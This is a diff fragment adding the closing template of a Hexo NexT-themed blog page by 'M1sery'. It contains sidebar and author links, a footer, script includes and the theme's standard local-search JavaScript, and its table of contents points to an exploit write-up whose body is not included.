+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/46666.jpg"
+                alt="M1sery" />
+            
+              <p class="site-author-name" itemprop="name">M1sery</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">归档</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/M1serry" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:m0x0is3ry@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/atom.xml" target="_blank" title="RSS">
+                      
+                        <i class="fa fa-fw fa-feed"></i>RSS</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?V=3&Uin=865730396" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">外部链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2021 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-terminal"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M1sery</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 劲爆出击</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
